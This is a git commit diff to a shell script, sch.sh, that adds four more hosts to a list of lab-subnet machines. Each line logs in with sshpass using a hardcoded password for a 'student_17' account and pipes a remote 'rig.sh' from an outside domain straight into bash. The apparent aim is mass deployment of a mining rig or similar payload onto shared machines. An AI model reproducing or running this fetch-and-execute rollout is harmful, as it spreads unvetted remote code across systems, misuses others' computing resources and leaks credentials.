47ab42857080a58e8ddc935656cb075912cb1854
ivanhi0 <idbod@ivanhi0.ru>
2026-04-15 10:36:59 +0300

    Add more hosts

--- sch.sh
+++ sch.sh
@@ -8,8 +8,12 @@ sshpass -p 10001 ssh student_17@172.29.217.37 "curl -sSL https://bio.ivanhi0.ru/
 sshpass -p 10001 ssh student_17@172.29.217.38 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
 sshpass -p 10001 ssh student_17@172.29.217.40 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
 sshpass -p 10001 ssh student_17@172.29.217.41 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.70 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.79 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
 sshpass -p 10001 ssh student_17@172.29.217.154 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
 sshpass -p 10001 ssh student_17@172.29.217.178 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.179 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.182 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
 sshpass -p 10001 ssh student_17@172.29.217.183 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
 sshpass -p 10001 ssh student_17@172.29.217.190 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
 sshpass -p 10001 ssh student_17@172.29.217.199 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
